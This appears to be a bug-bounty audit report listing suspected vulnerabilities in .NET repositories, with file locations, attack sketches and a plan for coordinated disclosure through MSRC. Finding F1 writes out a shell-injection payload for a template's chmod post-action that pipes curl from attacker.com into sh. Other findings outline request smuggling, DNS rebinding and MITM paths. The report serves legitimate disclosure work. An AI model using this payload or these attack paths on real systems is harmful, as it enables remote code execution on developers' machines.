# Microsoft .NET Bug Bounty — Vulnerability Findings

> Audit date: 2026-10-07
> Repos audited: dotnet/runtime, dotnet/aspnetcore, dotnet/aspire, dotnet/sdk, dotnet/roslyn
> Focus: Critical and Important severity only

---

## TIER 1 — STRONGEST CANDIDATES

### F1. [SDK] Shell Command Injection via Template Chmod Post-Action
**Severity: CRITICAL | Default exploitable: YES**

**File:** `sdk/src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/ChmodPostActionProcessor.cs:42-51`

Template-controlled values interpolated directly into `/bin/sh -c "chmod ..."` with **zero sanitization**:
```csharp
FileName = "/bin/sh",
Arguments = $"-c \"chmod {entry.Key} {file}\""
```
Both `entry.Key` (permissions string) and `file` (filename) come from the template's `actionConfig.Args` dictionary.

**Consent bypass:** The dispatch logic in `PostActionDispatcher.cs:123-157` only gates `ProcessStartPostActionProcessor` behind a consent prompt. All other post-actions (chmod, AddJsonProperty, dotnet-sln) execute **automatically with zero user consent**.

**Attack:** Publish a malicious NuGet template. Template's `.template.config/template.json` defines a chmod post-action with crafted args like `"+x": ["normal.sh\"; curl attacker.com/payload.sh | sh; echo \""]`. User runs `dotnet new <template>` → RCE, no prompt.

---

### F2. [SDK] Workload Signature Verification Disabled on Linux/macOS
**Severity: IMPORTANT | Default exploitable: YES (non-Windows)**

**File:** `sdk/src/Cli/dotnet/Commands/Workload/WorkloadUtilities.cs:83-97`

```csharp
#if !TARGET_WINDOWS
    return false;  // unconditionally disables verification
#else
```

`ShouldVerifySignatures()` unconditionally returns `false` on Linux/macOS. Additionally, `FileBasedInstaller.cs:65-68` hardcodes `verifyNuGetSignatures: false`.

**Attack:** MITM on `dotnet workload install` serves tampered manifests pointing to malicious packages. No signature check catches the substitution.

---

### F3. [Aspire] DNS Rebinding → Terminal WebSocket → Container Shell
**Severity: IMPORTANT (RCE path) | Default exploitable: YES in unsecured mode**

**Files:**
- `aspire/src/Aspire.Dashboard/Model/WebSocketOriginValidator.cs:26-29`
- `aspire/src/Aspire.Dashboard/Terminal/TerminalWebSocketProxy.cs:556`

WebSocket origin check compares `Origin` header host against `Request.Host` — **both client-controlled**. Code comments explicitly state: *"Request.Host is client-controlled, so this same-origin check does not prevent DNS rebinding."*

**Attack:** In unsecured mode, attacker's website DNS-rebinds to dashboard IP. Gets WebSocket access to:
1. Blazor SignalR circuit (full dashboard interaction)
2. `/api/terminal` proxy — **shell access to containers** = RCE

---

### F4. [ASP.NET Core] Kestrel Bare LF Acceptance — HTTP Request Splitting
**Severity: IMPORTANT | Default exploitable: YES**

**File:** `aspnetcore/src/Servers/Kestrel/Core/src/Internal/Http/HttpParser.cs:52`

Kestrel accepts bare `\n` (LF without CR) as a valid HTTP/1.1 line terminator **by default**. Strict CRLF enforcement requires opt-in via `KestrelServerOptions.DisableHttp1LineFeedTerminatorsSwitchKey`.

**Attack:** Behind a CRLF-strict proxy (nginx, HAProxy, IIS ARR, Azure Front Door), attacker crafts a request with bare `\n` in header values. Proxy treats it as data, Kestrel splits at `\n` — creating a smuggled second request. Enables cache poisoning, session hijacking, auth bypass.

---

### F5. [Runtime] CryptoConfig.CreateFromName — Type Instantiation via SignedXml
**Severity: IMPORTANT | Default exploitable: Partial**

**Files:**
- `runtime/src/libraries/System.Security.Cryptography/src/System/Security/Cryptography/CryptoConfig.cs:427`
- `runtime/src/libraries/System.Security.Cryptography.Xml/src/System/Security/Cryptography/Xml/SignedXml.cs:1014-1019`

`CryptoConfig.CreateFromName` falls through to `Type.GetType(name)` when no known algorithm matches, then instantiates via reflection. Constructor side effects fire **before** the `as T` cast.

Chain: Attacker-controlled XML `SignatureMethod` → `CryptoHelpers` → `CryptoConfig.CreateFromName` → `Type.GetType` → constructor invocation. Additionally, `SignedXml.cs:1019` calls `Type.GetType(signatureDescription.KeyAlgorithm!)` with **no filter at all**.

**Mitigating:** Comma filter blocks assembly-qualified names (cross-assembly resolution). Most apps use known URIs.

---

## TIER 2 — STRONG LEADS

### F6. [Aspire] OTLP Telemetry Endpoints Default Unsecured
**Severity: IMPORTANT | Default exploitable: YES**

**File:** `aspire/src/Aspire.Dashboard/Configuration/PostConfigureDashboardOptions.cs:94`

```csharp
options.Otlp.AuthMode ??= OtlpAuthMode.Unsecured;
```

Frontend defaults to BrowserToken (secured), but OTLP ingestion (`/v1/logs`, `/v1/traces`, `/v1/metrics`) defaults to `Unsecured`. The `[Authorize]` attribute exists but the unsecured handler always returns `AuthenticateResult.Success`. Anyone on the network can inject arbitrary telemetry.

---

### F7. [Roslyn] ScriptOptions Insecure Defaults
**Severity: IMPORTANT | Default exploitable: YES (if scripting API used)**

**File:** `roslyn/src/Scripting/Core/ScriptOptions.cs:35,47-74`

Default `ScriptOptions`: `allowUnsafe: true`, includes `System.Diagnostics.Process` and `System.Runtime.InteropServices` in default references. Any app calling `CSharpScript.EvaluateAsync(userInput)` with defaults = full RCE.

---

### F8. [Roslyn] Ref Safety Scope Tracking Leak
**Severity: IMPORTANT | Default exploitable: Needs PoC**

**File:** `roslyn/src/Compilers/CSharp/Portable/Binder/RefSafetyAnalysis.cs:258-265,536-542`

Both `RemovePlaceholderScope` and `RemoveLocalScopes` have scope removal logic **commented out** (tracking issue #65961). Stale scope entries from inner scopes persist. Could cause incorrect ref escape analysis — compiler allows dangling reference in "safe" C# code → memory corruption.

---

### F9. [ASP.NET Core] CORS Origin Normalization Mismatch
**Severity: IMPORTANT | Default exploitable: App-dependent**

**Files:**
- `aspnetcore/src/Middleware/CORS/src/Infrastructure/CorsPolicyBuilder.cs:67-90`
- `aspnetcore/src/Middleware/CORS/src/Infrastructure/CorsPolicy.cs:175-178`

Policy setup stores origins as-is (no lowercasing for ASCII HTTP/HTTPS). Runtime comparison uses `StringComparer.Ordinal` (case-sensitive). Developer configures `"http://MyApp.Example.COM"`, browser sends `"http://myapp.example.com"` → match fails → developer switches to `AllowAnyOrigin` or permissive callback.

---

### F10. [SDK] AddJsonProperty Post-Action Directory Traversal
**Severity: MEDIUM-HIGH | Default exploitable: YES**

**File:** `sdk/src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/AddJsonPropertyPostActionProcessor.cs:112-118,134-136`

When `includeAllParentDirectoriesInSearch: true`, walks up to `int.MaxValue` parent directories. When `allowFileCreation: true` and `detectRepositoryRoot: true`, creates files at repo root — potentially far outside template output directory. Runs without consent.

**Attack:** Malicious template injects `scripts.postinstall` into `package.json` above the output dir, or modifies `appsettings.json` connection strings.

---

### F11. [SDK] NuGet Signature Verification Off by Default on macOS
**Severity: MEDIUM | Default exploitable: YES (macOS)**

**File:** `sdk/src/Cli/dotnet/NugetPackageDownloader/NuGetPackageDownloader.cs:88-103`

macOS: disabled by default (must opt in via `DOTNET_NUGET_SIGNATURE_VERIFICATION=true`). MITM on `dotnet tool install -g` = tampered tool packages with no check.

---

## TIER 3 — SECONDARY FINDINGS

### F12. [SDK] GetTargetFilesPaths Path Traversal in Template Post-Actions
**File:** `sdk/src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/PostActionProcessorBase.cs:88-114`
`Path.GetFullPath()` resolves `..` without validating result stays within `outputBasePath`. Runs without consent.

### F13. [Aspire] Container Runtime Argument Escaping Deficiency
**File:** `aspire/src/Aspire.Hosting/Publishing/ContainerRuntimeBase.cs:642`
`EscapeArgument` only handles `"` → `\"`. Build args interpolated with no escaping. Codebase's own `DevTunnelCli.cs` uses the safe `ArgumentList` pattern.

### F14. [Runtime] BinaryFormatter Enabled by Default at Library Switch Level
**File:** `runtime/src/libraries/System.Runtime.Serialization.Formatters/src/System/Runtime/Serialization/LocalAppContextSwitches.cs:16`
`defaultValue: true` for `EnableUnsafeBinaryFormatterSerialization`. Mitigated: SDK projects override to `false`, `[Obsolete]` with compiler error since .NET 9.

### F15. [Runtime] System.Speech Grammar.Create Loads Arbitrary Assemblies
**File:** `runtime/src/libraries/System.Speech/src/Recognition/Grammar.cs:425,435,459`
`Assembly.LoadFrom(grammarName)` in catch-all fallback. Windows-only, rarely web-facing.

### F16. [ASP.NET Core] CL+TE Request Smuggling via AppContext Switch
**File:** `aspnetcore/src/Servers/Kestrel/Core/src/Internal/Http/Http1MessageBody.cs:18,185-207`
`AllowKeepAliveAfterCLTE` switch keeps connections alive with both Content-Length and Transfer-Encoding. Safe by default (off), but if enabled for backward compat = classic smuggling.

### F17. [SDK] ComSpec Environment Variable Hijacking
**File:** `sdk/src/Cli/dotnet/CommandFactory/CommandResolution/WindowsExePreferredCommandSpecFactory.cs:51`
`cmd.exe` path from `ComSpec` env var. Attacker controlling env var redirects execution. Windows-only, requires env var control.

### F18. [Roslyn] Source Generators — Zero Sandboxing
**File:** `roslyn/src/Compilers/Core/Portable/SourceGeneration/GeneratorContexts.cs:48`
Full `Compilation` object exposed. Generators run with full .NET permissions during `dotnet build`. Supply chain RCE vector via malicious NuGet packages.

### F19. [Aspire] Telemetry API Token Exchange
**File:** `aspire/src/Aspire.Dashboard/DashboardEndpointsBuilder.cs:112-134`
`/api/telemetry/validateToken` is `AllowAnonymous()`, exchanges browser token for API key. Privilege escalation from "viewer" to "programmatic API consumer."

---

## SUBMISSION PRIORITY

| # | Finding | Repo | Severity | Payout Target | Ready? |
|---|---------|------|----------|---------------|--------|
| F1 | Chmod shell injection | SDK | Critical | $40,000 | PoC needed |
| F3 | DNS rebinding → terminal shell | Aspire | Important→Critical | $40,000 | PoC needed |
| F4 | Bare LF request splitting | ASP.NET Core | Important | $30,000+ | PoC needed (proxy-specific) |
| F2 | Workload sig bypass (non-Win) | SDK | Important | $30,000 | Documented, MITM PoC |
| F5 | CryptoConfig type instantiation | Runtime | Important | $30,000 | Needs gadget chain |
| F6 | OTLP unsecured default | Aspire | Important | $20,000 | PoC straightforward |
| F10 | AddJsonProperty traversal | SDK | Medium-High | $20,000 | PoC via template |

---

## NEXT STEPS

1. **Build PoCs** — F1 (chmod injection) is the cleanest: craft a malicious template, run `dotnet new`, demonstrate RCE
2. **Test F4** — Set up Kestrel behind nginx/HAProxy, send bare-LF smuggling payload
3. **Test F3** — Stand up Aspire dashboard in unsecured mode, DNS rebind, access terminal WebSocket
4. **Check CVEs** — Verify none of these are already reported/patched
5. **Submit via MSRC Researcher Portal** — one finding per submission, follow CVD
